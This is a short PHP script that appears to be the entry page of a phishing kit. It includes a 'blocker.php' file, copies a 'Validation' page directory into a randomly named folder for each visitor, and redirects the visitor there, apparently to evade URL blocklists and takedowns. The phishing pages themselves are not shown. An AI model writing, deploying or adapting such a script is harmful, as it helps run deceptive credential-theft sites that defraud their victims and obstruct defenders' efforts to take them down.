<?php

include('blocker.php');

$random = rand(0,100000000000);
$dst    = substr(md5($random), 0, 1000000000);

//+++++++++++++++++// CREATE FOLDER AND COPY FILE \\+++++++++++++++++\\

function recurse_copy($src,$dst)
{
	$dir = opendir($src);
	@mkdir($dst);
	while(false !== ( $file = readdir($dir)) ) {
		if (( $file != '.' ) && ( $file != '..' )) {
			if ( is_dir($src . '/' . $file) ) {
				recurse_copy($src . '/' . $file,$dst . '/' . $file);
			}
			else {
				copy($src . '/' . $file,$dst . '/' . $file);
			}
		}
	}
	closedir($dir);
}

$src="Validation";
recurse_copy( $src, $dst );

header("location:".$dst."");

?>
